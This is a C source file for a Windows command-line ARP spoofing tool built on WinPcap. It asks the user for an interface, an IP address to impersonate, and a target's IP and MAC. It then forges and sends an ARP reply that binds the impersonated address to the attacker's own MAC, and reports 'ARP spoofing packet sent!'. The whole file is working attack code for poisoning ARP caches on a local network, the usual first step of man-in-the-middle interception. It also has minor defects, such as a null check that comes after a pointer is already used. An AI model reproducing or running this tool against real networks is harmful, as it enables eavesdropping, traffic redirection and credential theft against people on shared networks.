#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <pcap.h>
#include <iphlpapi.h>

#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

#pragma pack(push, 1)
struct eth_header {
    uint8_t dest_mac[6];
    uint8_t src_mac[6];
    uint16_t eth_type;
};

struct arp_packet {
    uint16_t htype;
    uint16_t ptype;
    uint8_t hlen;
    uint8_t plen;
    uint16_t op;
    uint8_t sha[6];
    uint32_t spa;
    uint8_t tha[6];
    uint32_t tpa;
};
#pragma pack(pop)

uint32_t ip_to_uint(const char *ip) {
    struct in_addr addr;
    return inet_pton(AF_INET, ip, &addr) == 1 ? addr.S_un.S_addr : 0;
}

int mac_str_to_bytes(const char *mac_str, uint8_t *mac_bytes) {
    int values[6];
    if (sscanf(mac_str, "%x:%x:%x:%x:%x:%x", &values[0], &values[1], 
               &values[2], &values[3], &values[4], &values[5]) != 6) {
        return -1;
    }
    for (int i = 0; i < 6; i++) mac_bytes[i] = (uint8_t)values[i];
    return 0;
}

int main() {
    pcap_if_t *alldevs, *d;
    char errbuf[PCAP_ERRBUF_SIZE];
    int i, inum;

    if (pcap_findalldevs(&alldevs, errbuf) == -1) {
        fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
        return 1;
    }

    for (d = alldevs, i = 0; d != NULL; d = d->next, i++)
        printf("%d. %s\n%s\n", i+1, d->name, d->description ? d->description : "No description");

    if (!i) {
        printf("No interfaces found! Install WinPcap.\n");
        return 1;
    }

    printf("Enter interface number (1-%d): ", i);
    scanf("%d", &inum);
    if (inum < 1 || inum > i) {
        printf("Invalid interface number.\n");
        pcap_freealldevs(alldevs);
        return 1;
    }

    for (d = alldevs, i = 0; i < inum - 1; d = d->next, i++);

    const char *guid_start = strchr(d->name, '{');
    const char *guid_end = strchr(guid_start, '}');
    if (!guid_start || !guid_end) {
        printf("Invalid device GUID.\n");
        pcap_freealldevs(alldevs);
        return 1;
    }

    char guid[guid_end - guid_start];
    strncpy(guid, guid_start + 1, guid_end - guid_start - 1);
    guid[guid_end - guid_start - 1] = '\0';

    PIP_ADAPTER_ADDRESSES pAdapterAddresses = NULL;
    ULONG bufferSize = 0;
    uint8_t src_mac[6] = {0};

    GetAdaptersAddresses(AF_UNSPEC, 0, NULL, NULL, &bufferSize);
    pAdapterAddresses = (PIP_ADAPTER_ADDRESSES)malloc(bufferSize);
    if (!pAdapterAddresses) {
        perror("malloc");
        pcap_freealldevs(alldevs);
        return 1;
    }

    if (GetAdaptersAddresses(AF_UNSPEC, 0, NULL, pAdapterAddresses, &bufferSize) != ERROR_SUCCESS) {
        printf("GetAdaptersAddresses failed.\n");
        free(pAdapterAddresses);
        pcap_freealldevs(alldevs);
        return 1;
    }

    PIP_ADAPTER_ADDRESSES pAdapter;
    for (pAdapter = pAdapterAddresses; pAdapter; pAdapter = pAdapter->Next) {
        if (strstr(pAdapter->AdapterName, guid) && pAdapter->PhysicalAddressLength == 6) {
            memcpy(src_mac, pAdapter->PhysicalAddress, 6);
            break;
        }
    }

    free(pAdapterAddresses);
    pcap_freealldevs(alldevs);

    if (!pAdapter) {
        printf("Adapter MAC not found.\n");
        return 1;
    }

    pcap_t *fp = pcap_open_live(d->name, 65536, 1, 1000, errbuf);
    if (!fp) {
        fprintf(stderr, "Error opening adapter: %s\n", errbuf);
        return 1;
    }

    char sender_ip[16], target_ip[16], target_mac[18];
    printf("Sender IP to spoof: ");
    scanf("%15s", sender_ip);
    printf("Target IP: ");
    scanf("%15s", target_ip);
    printf("Target MAC (XX:XX:XX:XX:XX:XX): ");
    scanf("%17s", target_mac);

    uint32_t spa = ip_to_uint(sender_ip);
    uint32_t tpa = ip_to_uint(target_ip);
    uint8_t tha[6];
    if (mac_str_to_bytes(target_mac, tha) != 0) {
        printf("Invalid MAC format.\n");
        pcap_close(fp);
        return 1;
    }

    struct eth_header eth_hdr;
    memcpy(eth_hdr.dest_mac, tha, 6);
    memcpy(eth_hdr.src_mac, src_mac, 6);
    eth_hdr.eth_type = htons(0x0806);

    struct arp_packet arp_pkt = {
        .htype = htons(1),
        .ptype = htons(0x0800),
        .hlen = 6,
        .plen = 4,
        .op = htons(2),
        .spa = spa,
        .tpa = tpa
    };
    memcpy(arp_pkt.sha, src_mac, 6);
    memcpy(arp_pkt.tha, tha, 6);

    uint8_t packet[sizeof(struct eth_header) + sizeof(struct arp_packet)];
    memcpy(packet, &eth_hdr, sizeof(eth_hdr));
    memcpy(packet + sizeof(struct eth_header), &arp_pkt, sizeof(arp_pkt));

    if (pcap_sendpacket(fp, packet, sizeof(packet)) != 0) {  
        fprintf(stderr, "Send error: %s\n", pcap_geterr(fp));
        pcap_close(fp);
        return 1;
    }

    printf("ARP spoofing packet sent!\n");
    pcap_close(fp);
    return 0;
}
